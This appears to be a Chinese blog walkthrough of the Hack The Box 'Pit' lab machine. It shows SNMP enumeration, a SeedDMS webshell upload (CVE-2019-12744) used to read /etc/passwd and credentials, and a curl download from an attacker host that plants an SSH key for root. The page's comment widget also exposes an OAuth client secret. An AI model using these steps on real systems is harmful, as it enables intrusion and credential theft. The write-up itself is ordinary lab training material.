<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Pit - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - PitHackthebox - Pit 靶场实战 靶场信息   靶场类型   信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.241   我们可以看到，该靶场开启了22、80、9090端口 并且有一个一个域名dms-pit.htb，咱们将它加入hosts里 vim &#x2F;etc&#x2F;hosts   首先我们访问">
<meta property="og:type" content="article">
<meta property="og:title" content="Pit - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - PitHackthebox - Pit 靶场实战 靶场信息   靶场类型   信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.241   我们可以看到，该靶场开启了22、80、9090端口 并且有一个一个域名dms-pit.htb，咱们将它加入hosts里 vim &#x2F;etc&#x2F;hosts   首先我们访问">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/bbf059c6-783d-4365-81b4-94a4de3c072c.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/0bbbf1f9-d927-403b-aceb-ab6273424d52.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/7e61779b-6c26-4716-b97f-c5fdc080e79b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/ba406a30-1b3f-4c6e-aeb9-a585bb847377.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/d281e399-5528-4d7c-adcb-94ac8154adae.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/ba375abe-7109-4ebc-8e48-cf8408dd013a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/fad87eb2-1064-4599-ad8c-12592f8afec0.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/699127a3-bb17-4b4b-a1a6-2ad7d1b1a5ec.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/2a3dfe26-2563-423f-948f-ef8f934b89f7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/317c333d-ff16-476c-95e4-134ded5c27fc.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/78f6ba4d-d324-4893-9229-551e18c301f6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/6b5a9014-98a4-4a09-b39b-a614001b6877.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/ef83b24a-64c2-455d-9c45-024ca7d2dc11.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/9a5a1de5-4e43-4344-8f4d-b25434fe96af.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/858b9c44-4146-4cd4-a194-fd204987c23b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/4534ed96-341d-46b1-b781-110266905fb7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/e85629a1-7c98-46d4-a0e2-a454c699c91d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/c6ce8fa2-ee2f-4a79-877c-0052329f129e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/c5ed362e-3130-49fa-936b-fe3df954e5de.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/bc3c044d-ad4b-40bd-8029-0028afc9aa8e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/b95de7b7-1f9e-4ded-a7ae-e9dc6fee9cbe.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/65ae73c8-492c-4cb1-b63b-b6b4b2099125.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/d8efd785-fd5c-400d-95a0-d9cfb6585cf8.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/4715297c-072d-4f4e-b065-6ca612721fcf.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/593bfb4d-baf6-4b62-b9f6-4921bbadb41a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/a92b1b53-6a8d-481b-bc9a-12770d201ee0.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/cb0477e3-73b3-4b1b-9d72-907011cbf567.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/92b6d609-78b9-4b88-93b7-0ec40dafbb0d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/e5da7a3f-d24e-4e04-b068-7e31b9c25da0.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/5e0579f5-29b7-42eb-affd-f32061009df2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/5ad916d9-2535-4279-b9b4-f66ef3778f10.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/8052248d-6d55-4dbc-8136-559f3cff1595.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/9a1adb27-63e3-44a8-9137-a7d5e9d5fbab.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/88bd50ea-4d19-46eb-9ea8-f0b00a45dee4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/4b7d382c-72eb-4ef1-accf-ab27732f8053.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/45b44ec0-3a6b-4ec3-a44e-d567c309ca28.png">
<meta property="article:published_time" content="2021-06-11T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:48:55.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/bbf059c6-783d-4365-81b4-94a4de3c072c.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Pit - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Pit - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-06-11T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-06-11
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Pit"><span class="post-toc-text">Hackthebox - Pit</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Medium/Hackthebox-Pit"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Pit - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-06-11 19:38:36" datetime="2021-06-11T11:38:36.000Z"  itemprop="datePublished">2021-06-11</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Pit"><a href="#Hackthebox-Pit" class="headerlink" title="Hackthebox - Pit"></a>Hackthebox - Pit</h1><p><strong>Hackthebox - Pit 靶场实战</strong></p>
<p><strong>靶场信息</strong></p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/bbf059c6-783d-4365-81b4-94a4de3c072c.png" class>

<p><strong>靶场类型</strong></p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/0bbbf1f9-d927-403b-aceb-ab6273424d52.png" class>

<p><strong>信息搜集</strong></p>
<p>首先使用nmap进行端口扫描</p>
<p>nmap -A -sS -sC -sV 10.10.10.241</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/7e61779b-6c26-4716-b97f-c5fdc080e79b.png" class>

<p>我们可以看到，该靶场开启了22、80、9090端口</p>
<p>并且有一个一个域名dms-pit.htb，咱们将它加入hosts里</p>
<p>vim &#x2F;etc&#x2F;hosts</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/ba406a30-1b3f-4c6e-aeb9-a585bb847377.png" class>

<p>首先我们访问一下pit.htb看看</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/d281e399-5528-4d7c-adcb-94ac8154adae.png" class>

<p>就是一个Nginx的初始页面，没什么看的意义</p>
<p>接着咱们看看dms-pit.htb</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/ba375abe-7109-4ebc-8e48-cf8408dd013a.png" class>

<p>啊这，直接403，也不用看，那咱们去看看9090端口吧</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/fad87eb2-1064-4599-ad8c-12592f8afec0.png" class>

<p>好像是一个CentOS的在线管理页面，但是咱们也没密码啊</p>
<p>经过大量的目录搜集以后，我发现还是没什么有用的信息，没办法了呀，只能去官方论坛看看大佬们的提示了</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/699127a3-bb17-4b4b-a1a6-2ad7d1b1a5ec.png" class>

<p>大佬说在官方推特会有一个很好的提示，那咱们去找找看吧</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/2a3dfe26-2563-423f-948f-ef8f934b89f7.png" class>

<p>官方提示在WALK</p>
<p>所以咱们扫描一下这台机器的snmp开放端口吧</p>
<p>nmap -sU 10.10.10.241</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/317c333d-ff16-476c-95e4-134ded5c27fc.png" class>

<p>我们发现了他的SNMP版本</p>
<p>我们可以使用以下脚本来进行扫描</p>
<p><a href="https://github.com/dheiland-r7/snmp" target="_blank" rel="noopener">https://github.com/dheiland-r7/snmp</a></p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/78f6ba4d-d324-4893-9229-551e18c301f6.png" class>

<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/6b5a9014-98a4-4a09-b39b-a614001b6877.png" class>

<p>这里我们成功获得了内核版本、目录、用户名</p>
<p>目前信息获取搜集到这里，我们还是没有进一步的办法，咋办呢</p>
<p>在我翻找10.10.10.241.snmp文件的时候，发现了一行</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/ef83b24a-64c2-455d-9c45-024ca7d2dc11.png" class>

<p>这显然是一个目录啊，根据目录来构造，URL应该为<a href="http://localhost/seeddms51x/seeddms/%EF%BC%8C%E8%AE%A9%E5%92%B1%E4%BB%AC%E5%8E%BB%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B" target="_blank" rel="noopener">http://localhost/seeddms51x/seeddms/，让咱们去尝试一下</a></p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/9a5a1de5-4e43-4344-8f4d-b25434fe96af.png" class>

<p>确认了URL为<a href="http://dms-pit.htb/seeddms51x/seeddms/" target="_blank" rel="noopener">http://dms-pit.htb/seeddms51x/seeddms/</a></p>
<p>然后需要账号密码，那还得去找找snmp文件</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/858b9c44-4146-4cd4-a194-fd204987c23b.png" class>

<p>发现了两个账户</p>
<p>root和michelle，咱们去尝试一下</p>
<p>测试后发现账号密码为michelle，既是账号，也是密码</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/4534ed96-341d-46b1-b781-110266905fb7.png" class>

<p><strong>漏洞利用</strong></p>
<p>这里咱们可以看到所使用的是SeedDMS，然后去搜索一下有没有相关的漏洞</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/e85629a1-7c98-46d4-a0e2-a454c699c91d.png" class>

<p>其中第四个是我们要的漏洞，咱们打开看一下</p>
<p>cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;47022.txt</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/c6ce8fa2-ee2f-4a79-877c-0052329f129e.png" class>

<p>CVE-2019-12744</p>
<p>这个漏洞的意思呢是</p>
<ol>
<li>登录应用程序并在任何文件夹下添加文档</li>
<li>选择文件作为简单的php后门文件或任何后门webshell都可以使用</li>
<li>上传后检查与文档对应的文档ID</li>
<li>访问example.com&#x2F;data&#x2F;1048576&#x2F;“document_id”&#x2F;1.php?cmd&#x3D;cat+&#x2F;etc&#x2F;passwd以在浏览器中利用</li>
</ol>
<p>第一步，在本地任意创建一个php文件，内容如下</p>
<p>“; $cmd &#x3D; ($_REQUEST[‘cmd’]); system($cmd); echo “”; die; } ?&gt;</p>
<p>第二步，登录后台后，依次点击 Docs -&gt; Users -&gt; Michelle -&gt; Add document</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/c5ed362e-3130-49fa-936b-fe3df954e5de.png" class>

<p>第三步，上传php马</p>
<p>第四步，复制php马的连接</p>
<p><a href="http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1" target="_blank" rel="noopener">http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1</a></p>
<p>从上我们可以得知文档ID为44，然后我们构造poc</p>
<p><a href="http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd" target="_blank" rel="noopener">http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd</a></p>
<p><a href="http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd" target="_blank" rel="noopener">http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd</a></p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/bc3c044d-ad4b-40bd-8029-0028afc9aa8e.png" class>

<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/b95de7b7-1f9e-4ded-a7ae-e9dc6fee9cbe.png" class>

<p>成功利用该漏洞</p>
<p>该shell会五分钟删除一次，如果被删除了大家重新上传一次即可</p>
<p>咱们查看一下conf&#x2F;settings.xml文件</p>
<p><a href="http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml" target="_blank" rel="noopener">http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml</a></p>
<p>打开后会发现这是一个空白页面，咱们查看一下源文件</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/65ae73c8-492c-4cb1-b63b-b6b4b2099125.png" class>

<p>成功拿到数据库账号密码</p>
<p>seeddms</p>
<p>ied^ieY6xoquu</p>
<p>咱们可以看到，数据库账号密码并没有在系统账户里，也就是说无法直接利用ssh进行登录，应该怎么办呢？突然想到，咱们9090端口不是需要一个账号密码嘛，咱们去试试</p>
<p>经过测试，账号是michelle，密码是ied^ieY6xoquu</p>
<p>OK，咱们成功登录</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/d8efd785-fd5c-400d-95a0-d9cfb6585cf8.png" class>

<p>突然，我的眼光就被“终端”两个字吸引了</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/4715297c-072d-4f4e-b065-6ca612721fcf.png" class>

<p>咱们这就直接从nginx权限，拿到了一个users的权限</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/593bfb4d-baf6-4b62-b9f6-4921bbadb41a.png" class>

<p>成功获得user权限的flag</p>
<p><strong>权限提升</strong></p>
<p>咱们继续把目光放在snmp文件上</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/a92b1b53-6a8d-481b-bc9a-12770d201ee0.png" class>

<p>在经过确认后，我把眼光放在了这一行上，咱们去看看这个文件</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/cb0477e3-73b3-4b1b-9d72-907011cbf567.png" class>

<p>这是一个bash脚本，感觉可能有用，先记录上</p>
<p>上面的脚本显示了从另一个位置运行了脚本，咱们一步步跟过去看看</p>
<p>ls -la &#x2F;usr&#x2F;local&#x2F;monitoring&#x2F;</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/92b6d609-78b9-4b88-93b7-0ec40dafbb0d.png" class>

<p>无法列出，应该是权限不足，咱们看看该目录的权限</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/e5da7a3f-d24e-4e04-b068-7e31b9c25da0.png" class>

<p>咱们对这个目录有读、写、执行以及+权限</p>
<p>也就是有权限扩展，让咱们查看一下</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/5e0579f5-29b7-42eb-affd-f32061009df2.png" class>

<p>从上面可以解读出，该目录属于root用户，其他用户有所有权限，但michelle用户只有写入和执行权限</p>
<p>让我们创建一个文件来找出想要的东西</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/5ad916d9-2535-4279-b9b4-f66ef3778f10.png" class>

<p>成功了</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/8052248d-6d55-4dbc-8136-559f3cff1595.png" class>

<p>创建一个sh文件，填入公钥，然后上传到服务器</p>
<p>本地使用python3开启一个http服务器</p>
<p>python3 -m http.server 80</p>
<p>在终端中使用curl进行下载</p>
<p>curl <a href="http://10.10.14.236/check.sh%20-o%20check.sh" target="_blank" rel="noopener">http://10.10.14.236/check.sh -o check.sh</a></p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/9a1adb27-63e3-44a8-9137-a7d5e9d5fbab.png" class>

<p>然后拷贝到&#x2F;usr&#x2F;local&#x2F;monitoring&#x2F;目录下</p>
<p>cp check.sh &#x2F;usr&#x2F;local&#x2F;monitoring&#x2F;</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/88bd50ea-4d19-46eb-9ea8-f0b00a45dee4.png" class>

<p>root账户正运行着一个脚本，监控目录的内容然后在五分钟后删除</p>
<p>把我们的shell放进去后，我们需要在本地运行SNMPwalk应用程序执行它</p>
<p>snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/4b7d382c-72eb-4ef1-accf-ab27732f8053.png" class>

<p>然后咱们使用ssh进行连接</p>
<p>ssh -i lucifiel <a href="mailto:root@10.10.10.241">root@10.10.10.241</a></p>
<p>如果这里提示<a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#x31;&#48;&#46;&#x32;&#52;&#49;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#x31;&#48;&#46;&#x32;&#52;&#49;</a>: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</p>
<p>则是snmpwalk的问题，输入sudo apt-get install snmp-mibs-downloader进行重新安装即可</p>
<img src="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/45b44ec0-3a6b-4ec3-a44e-d567c309ca28.png" class>

<p>成功拿到root权限的flag</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/&title=《Pit - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/&title=《Pit - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Pit - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Dynstr - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Atom - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2024</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/&title=《Pit - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/&title=《Pit - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
